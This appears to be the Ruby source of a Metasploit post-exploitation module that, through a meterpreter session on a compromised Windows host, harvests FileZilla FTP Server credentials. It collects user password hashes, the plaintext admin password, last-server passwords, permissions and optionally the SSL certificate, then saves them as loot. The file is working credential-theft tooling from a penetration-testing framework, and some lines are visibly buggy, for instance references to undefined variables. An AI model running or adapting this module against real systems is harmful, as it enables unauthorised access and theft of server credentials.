##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'rexml/document'

class Metasploit3 < Msf::Post

  include Msf::Post::File

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Windows Gather FileZilla FTP Server Credential Collection',
      'Description'    => %q{ This module will collect credentials from the FileZilla FTP server if installed. },
      'License'        => MSF_LICENSE,
      'Author'         => ['bannedit'],
      'Platform'       => ['win'],
      'SessionTypes'   => ['meterpreter' ]
    ))

    register_options(
      [
        OptBool.new('SSLCERT', [false, 'Loot the SSL Certificate if its there?', false]), # useful perhaps for MITM
      ], self.class)
  end


  def run
    if session.type != "meterpreter"
      print_error "Only meterpreter sessions are supported by this post module"
      return
    end

    @progs = "#{session.sys.config.getenv('ProgramFiles')}\\"

    filezilla = check_filezilla
    get_filezilla_creds(filezilla) if filezilla != nil
  end


  def check_filezilla
    paths = []
    path = @progs + "FileZilla Server\\"

    print_status("Checking for Filezilla Server directory in: #{path}")

    begin
      session.fs.dir.entries(path)
    rescue ::Exception => e
      print_error(e.to_s)
      return
    end

    session.fs.dir.foreach(path) do |fdir|
      ['FileZilla Server.xml','FileZilla Server Interface.xml'].each do|xmlfile|
        if fdir.eql? xmlfile
          pathtmp = File.join(path + xmlfile)
          vprint_status("Configuration File Found: %s" % pathtmp)
          paths << pathtmp
        end
      end
    end

    if !paths.empty?
      print_good("Found FileZilla Server on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
      print_line("")
      return paths
    end

    return nil
  end


  def get_filezilla_creds(paths)
    fs_xml  = ""   # FileZilla Server.xml           - Settings for the local install
    fsi_xml = ""   # FileZilla Server Interface.xml - Last server used with the interface
    credentials = Rex::Ui::Text::Table.new(
    'Header'    => "FileZilla FTP Server Credentials",
    'Indent'    => 1,
    'Columns'   =>
    [
      "Host",
      "Port",
      "User",
      "Password",
      "SSL"
    ])

    permissions = Rex::Ui::Text::Table.new(
    'Header'    => "FileZilla FTP Server Permissions",
    'Indent'    => 1,
    'Columns'   =>
    [
      "Host",
      "User",
      "Dir",
      "FileRead",
      "FileWrite",
      "FileDelete",
      "FileAppend",
      "DirCreate",
      "DirDelete",
      "DirList",
      "DirSubdirs",
      "AutoCreate",
      "Home"
    ])

    configuration = Rex::Ui::Text::Table.new(
    'Header'    => "FileZilla FTP Server Configuration",
    'Indent'    => 1,
    'Columns'   =>
    [
      "FTP Port",
      "FTP Bind IP",
      "Admin Port",
      "Admin Bind IP",
      "Admin Password",
      "SSL",
      "SSL Certfile",
      "SSL Key Password"
    ])

    lastserver = Rex::Ui::Text::Table.new(
    'Header'    => "FileZilla FTP Last Server",
    'Indent'    => 1,
    'Columns'   =>
    [
      "IP",
      "Port",
      "Password"
    ])

    paths.each do|path|
      file = session.fs.file.new(path, "rb")
      until file.eof?
        if path.include? "FileZilla Server.xml"
         fs_xml << file.read
        elsif path.include? "FileZilla Server Interface.xml"
         fsi_xml << file.read
        end
      end
      file.close
    end

    # user credentials password is just an MD5 hash
    # admin pass is just plain text. Priorities?
    creds, perms, config = parse_server(fs_xml)

    creds.each do |cred|
      credentials << [cred['host'], cred['port'], cred['user'], cred['password'], cred['ssl']]

      session.db_record ? (source_id = session.db_record.id) : (source_id = nil)

      service_data = {
        address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
        port: config['ftp_port'],
        service_name: 'ftp',
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :session,
        jtr_format: 'raw-md5',
        session_id: session_db_id,
        post_reference_name: self.refname,
        private_type: :nonreplayable_hash,
        private_data: cred['password'],
        username: cred['user']
      }

      credential_data.merge!(service_data)

      credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      login_data ={
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      # Merge in the service data and create our Login
      login_data.merge!(service_data)
      login = create_credential_login(login_data)
    end

    perms.each do |perm|
      permissions << [perm['host'], perm['user'], perm['dir'], perm['fileread'], perm['filewrite'], perm['filedelete'], perm['fileappend'],
        perm['dircreate'], perm['dirdelete'], perm['dirlist'], perm['dirsubdirs'], perm['autocreate'], perm['home']]
    end

    configuration << [config['ftp_port'], config['ftp_bindip'], ['admin_port'], config['admin_bindip'], config['admin_pass'],
      config['ssl'], config['ssl_certfile'], config['ssl_keypass']]

    session.db_record ? (source_id = session.db_record.id) : (source_id = nil)

    # report the goods!
    if config['ftp_port'] == "<none>"
      vprint_status("Detected Default Adminstration Settings:")
      config['ftp_port'] = "21"
    else
      vprint_status("Collected the following configuration details:")
      service_data = {
        address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
        port: config['admin_port'],
        service_name: 'filezilla-admin',
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        private_type: :password,
        private_data: config['admin_pass'],
        username: 'admin'
      }

      credential_data.merge!(service_data)

      credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      login_data ={
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      # Merge in the service data and create our Login
      login_data.merge!(service_data)
      login = create_credential_login(login_data)
    end

    vprint_status("       FTP Port: %s" % config['ftp_port'])
    vprint_status("    FTP Bind IP: %s" % config['ftp_bindip'])
    vprint_status("            SSL: %s" % config['ssl'])
    vprint_status("     Admin Port: %s" % config['admin_port'])
    vprint_status("  Admin Bind IP: %s" % config['admin_bindip'])
    vprint_status("     Admin Pass: %s" % config['admin_pass'])
    vprint_line("")

    lastser = parse_interface(fsi_xml)
    lastserver << [lastser['ip'], lastser['port'], lastser['password']]

    vprint_status("Last Server Information:")
    vprint_status("         IP: %s" % lastser['ip'])
    vprint_status("       Port: %s" % lastser['port'])
    vprint_status("   Password: %s" % lastser['password'])
    vprint_line("")

    p = store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
      "filezilla_server_credentials.csv", "FileZilla FTP Server Credentials")
    print_status("Credentials saved in: #{p.to_s}")

    p = store_loot("filezilla.server.perms", "text/csv", session, permissions.to_csv,
      "filezilla_server_permissions.csv", "FileZilla FTP Server Permissions")
    print_status("Permissions saved in: #{p.to_s}")

    p = store_loot("filezilla.server.config", "text/csv", session, configuration.to_csv,
      "filezilla_server_configuration.csv", "FileZilla FTP Server Configuration")
    print_status("     Config saved in: #{p.to_s}")

    p = store_loot("filezilla.server.lastser", "text/csv", session, lastserver.to_csv,
      "filezilla_server_lastserver.csv", "FileZilla FTP Last Server")
    print_status(" Last server history: #{p.to_s}")

    print_line("")
  end


  def parse_server(data)
    creds = []
    perms = []
    settings = {}
    users = 0
    passwords = 0
    groups = []
    perm = {}

    begin
      doc = REXML::Document.new(data).root
    rescue REXML::ParseException => e
      print_error("Invalid xml format")
    end

    opt = doc.elements.to_a("Settings/Item")
    if opt[1].nil?    # Default value will only have a single line, for admin port - no adminstration settings
      settings['admin_port'] = opt[0].text rescue "<none>"
      settings['ftp_port']   = "<none>"
    else
      settings['ftp_port']   = opt[0].text rescue "<none>"
      settings['admin_port'] = opt[16].text rescue "<none>"
    end
    settings['admin_pass'] = opt[17].text rescue "<none>"
    settings['local_host'] = opt[18].text rescue ""
    settings['bindip']     = opt[38].text rescue ""
    settings['ssl']        = opt[42].text rescue ""

    # empty means localhost only * is 0.0.0.0
    settings['local_host'] ? (settings['admin_bindip'] = settings['local_host']) : (settings['admin_bindip'] = "127.0.0.1")
    settings['admin_bindip'] = "0.0.0.0" if settings['admin_bindip'] == "*" or settings['admin_bindip'].empty?

    settings['bindip'] ? (settings['ftp_bindip'] = settings['bindip']) : (settings['ftp_bindip'] = "127.0.0.1")
    settings['ftp_bindip'] = "0.0.0.0" if settings['ftp_bindip'] == "*" or settings['ftp_bindip'].empty?

    if settings['ssl'] == "1"
      settings['ssl'] = "true"
    else
      if datastore['SSLCERT']
        print_error("Cannot loot the SSL Certificate, SSL is disabled in the configuration file")
      end
      settings['ssl'] = "false"
    end

    settings['ssl_certfile'] = items[45].text rescue "<none>"
    if settings['ssl_certfile'] != "<none>" and settings['ssl'] == "true" and datastore['SSLCERT']   # lets get the file if its there could be useful in MITM attacks
      sslfile = session.fs.file.new(settings['ssl_certfile'])
      until sslfile.eof?
        sslcert << sslfile.read
      end
      store_loot("filezilla.server.ssl.cert", "text/plain", session, sslfile,
        settings['ssl_cert'] + ".txt", "FileZilla Server SSL Certificate File" )
      print_status("Looted SSL Certificate File")
    end

    settings['ssl_certfile'] = "<none>" if settings['ssl_certfile'].nil?

    settings['ssl_keypass'] = items[50].text rescue "<none>"
    settings['ssl_keypass'] = "<none>" if settings['ssl_keypass'].nil?

    vprint_status("Collected the following credentials:") if !doc.elements['Users'].nil?

    doc.elements.each("Users/User") do |user|
      account = {}
      opt = user.elements.to_a("Option")
      account['user']     = user.attributes['Name'] rescue "<none>"
      account['password'] = opt[0].text rescue "<none>"
      account['group']    = opt[1].text rescue "<none>"
      users     += 1
      passwords += 1
      groups << account['group']

      user.elements.to_a("Permissions/Permission").each do |permission|
        opt = permission.elements.to_a("Option")
        perm['user'] = account['user']   # give some context as to which user has these permissions
        perm['dir'] = permission.attributes['Dir']
        perm['fileread']   = opt[0].text rescue "<unknown>"
        perm['filewrite']  = opt[1].text rescue "<unknown>"
        perm['filedelete'] = opt[2].text rescue "<unknown>"
        perm['fileappend'] = opt[3].text rescue "<unknown>"
        perm['dircreate']  = opt[4].text rescue "<unknown>"
        perm['dirdelete']  = opt[5].text rescue "<unknown>"
        perm['dirlist']    = opt[6].text rescue "<unknown>"
        perm['dirsubdirs'] = opt[7].text rescue "<unknown>"
        perm['autocreate'] = opt[9].text rescue "<unknown>"

        opt[8].text == "1" ? (perm['home'] = "true") : (perm['home'] = "false")

        perms << perm
      end

      user.elements.to_a("IpFilter/Allowed").each do |allowed|
      end
      user.elements.to_a("IpFilter/Disallowed").each do |disallowed|
      end

      account['host'] = settings['ftp_bindip']
      perm['host']    = settings['ftp_bindip']
      account['port'] = settings['ftp_port']
      account['ssl']  = settings['ssl']
      creds << account

      vprint_status("    Username: %s" % account['user'])
      vprint_status("    Password: %s" % account['password'])
      vprint_status("       Group: %s" % account['group']) if account['group'] != nil
      vprint_line("")
    end

    # Rather than printing out all the values, just count up
    groups = groups.uniq unless groups.uniq.nil?
    if !datastore['VERBOSE']
      print_status("Collected the following credentials:")
      print_status("    Usernames: %u" % users)
      print_status("    Passwords: %u" % passwords)
      print_status("       Groups: %u" % groups.length)
      print_line("")
    end
    return [creds, perms, settings]
  end


  def parse_interface(data)
    lastser = {}

    begin
      doc = REXML::Document.new(data).root
    rescue REXML::ParseException => e
      print_error("Invalid xml format")
    end

    opt = doc.elements.to_a("Settings/Item")

    lastser['ip']       = opt[0].text rescue "<none>"
    lastser['port']     = opt[1].text rescue "<none>"
    lastser['password'] = opt[2].text rescue "<none>"

    lastser['password'] = "<none>" if lastser['password'] == nil

    return lastser
  end


  def got_root?
    if session.sys.config.getuid =~ /SYSTEM/
      return true
    end
    return false
  end


  def whoami
    return session.sys.config.getenv('USERNAME')
  end
end
